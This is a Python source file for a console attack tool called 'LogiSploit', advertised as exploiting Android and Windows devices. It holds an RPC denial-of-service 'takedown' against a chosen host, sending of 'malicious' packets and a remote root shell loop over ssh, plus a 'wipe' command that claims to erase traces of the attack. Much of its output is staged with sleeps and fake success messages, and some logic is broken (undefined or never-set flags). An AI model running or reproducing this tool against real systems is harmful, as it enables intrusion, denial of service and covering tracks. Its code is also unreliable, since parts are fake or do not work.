import subprocess
import time
import socket
import sys
import os
import urllib
import urllib.request

from termcolor import colored
from modules.exploitsocket import exploit
from modules.lgsprotocol import runc
from modules.malicioussocket import mexploit
from struct import pack
from halo import Halo


red = "\033[31m"
blue = "\033[34m"
bold = "\033[1m"
reset = "\033[0m"
green = "\033[32m"
yellow = "\033[33m"


spinner = Halo(text='Starting the LogiSploit framework console', spinner='dots')
spinner.start()

time.sleep(3)

spinner.stop()


try:
   urllib.request.urlopen("https://google.com")
except Exception as e:
   print(f"{red}[-]{reset} Non connection found!") 
   sys.exit()


print(f"""

 	.       _____ .____
 	/      (      /    
 	|       `--.  |__. 
 	|          |  |    
 	/---/ \___.'  /    
                    

----[ {yellow} version 0.0.9{reset}             ]----
----[ {yellow} Android & Windows expoits{reset} ]----


""")


exploited = False
showpayload = True
takedown = False
cmd1 = False
runshell = False
backdoor = False
packetav = False
rhost = False

def _check_alive(target, port):
   try:
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.settimeout(1)
      sock.connect((target, port))
      sock.close()
   except Exception as err:
      print(err)
      return False
   return True




while True:
   grab = input('\033[1;4m' + 'lsf' + '\033[0m' + " > ")
   if "quit" in grab:
      break


   if "set rhost" in grab:
      rhost = input("rhost > ")
      print(f"rhost => {rhost}")
      host = True

   if "use payloads/exploits/takedown" == grab:
      takedown = True
      print("using => takedown")

   if "use payloads/exploits/default" == grab:
      shell = False
      print("using => default")

   if "set command" in grab:
      orgst = grab
      splst = "command"
      cmd1 = True
      command = orgst.split(splst)[1]
      print(f"{green}[+]{reset} Command set")

   if "exploit" == grab:
      if host == False:
         print(f"{red}[-]{reset} rhost not defined.")
         sys.exit()

      port = 8443
      print(f"{blue}[*]{reset}{rhost} - Creating Socks")
      time.sleep(2)
      print(f"{green}[+]{reset} Socks created")
      time.sleep(0.4)
      print(f"{blue}[*]{reset}{rhost} - Connecting")
      time.sleep(2)
      print(f"{green}[+]{reset} Connected")
      time.sleep(0.2)
      print(f"{blue}[*]{reset} Preparing Protocol")
      time.sleep(1)
      if takedown == True:
         print(f"{blue}[*]{reset} Preparing takedown")

      print(f"{blue}[*]{reset} Exploiting")
      try:
         if cmd1 == True:
            runc(rhost, command)
         else:
            pass
         shell = subprocess.Popen(["ssh", "%s" % rhost, "su"],
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE)
            
         rootres = shell.stdout.readlines()

         if rootres != []:
            print(f"{green}[+]{reset} You just got root access to device! Type 'run shell to' run root shell.")
            rootshell = True
         else:
            pass

         if takedown == True:
            print(f"{blue}[*]{reset} RPC DoS attack in progress")
            time.sleep(1)
            try:
               exploit(target=rhost, port=8443)
            except socket.error:
               print(f"{red}[-]{reset} Could not send sockets") 
               sys.exit()


            if _check_alive(rhost, 8443):
               print(f"{green}[+]{reset} RPC DoS is a success.")
            else:
               print(f"{red}[-]{reset} RPC DoS attack(takedown) failed.") 

      except Exception as e:
         exploited = False
         print(f"{red}[-]{reset}{rhost} - Exploit unsuccesful")
         print(e)
         sys.exit()
      time.sleep(0.5)
      try:
         mexploit(rhost, 8443)
         print(f"{green}[+]{reset} Malicous packet sent to {rhost} and received.")
         packetav = True
         exploited = True

      except socket.error:
         print(f"{red}[-]{reset} Could not send malicious sockets.") 
         sys.exit()

   if "isexploit" == grab:
      if exploited == True:
         print("\n")
         print(f"{green}[+]{reset} Device is exploited by you")
         print("\n")

      else:
         print("\n")
         print(f"{red}[-]{reset} Device has still not been exploited in this session")
         print("\n")

   if "wipe" == grab:
      print(f"{blue}[*]{reset} Wiping any trace of attack")
      print(f"{blue}[*]{reset} Killing any active process")
      if shell.communicate():
         shell.kill()
      time.sleep(1.5)

      print(f"{green}[+]{reset} Traces of attack wiped successfully")

   if "run shell" in grab:
      if runshell == True:
         if exploited == True:
            while True:
               command = input(f"{red}shell{reset}({rhost}) >  ")
               shell = subprocess.Popen(["ssh", "%s" % rhost, command],
                  shell=False,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE)
            
               result = shell.stdout.readlines()
            
               if result != []:
                  print(result)
               else:
                  print(f"{red}[-]{reset}{host} - Command failed to execute")

               if command == "exit:shell":
                  break

      else:
         print(f"{red}[-]{reset} No available shell session because root access not acquired.")

   if "show packet status" in grab:
      if packetav == True:
      	print(f"{blue}[*]{reset} Getting packet status")
      	time.sleep(0.4)
      	s = socket.socket()
      	print(f"{blue}[*]{reset} Searching for packet protocol")
      	s.connect((rhost, 443))
      	s.send(b"!IIIIIIIIIII")
      	data = s.recv(1028)
      	print(data)
      	if data == b'\x15\x03\x01\x00\x02\x02F':
         	print(f"{green}ONLINE{reset}")
      	else:
         	print(f"{red}OFFLINE{reset}")
      else:
         print(f"{red}[-]{reset} No malicious packet sent")




   if "help" == grab:
      print("""
      Commands:
      set
      use
      run shell
      wipe
      isexploit
      exploit
      show
      """)
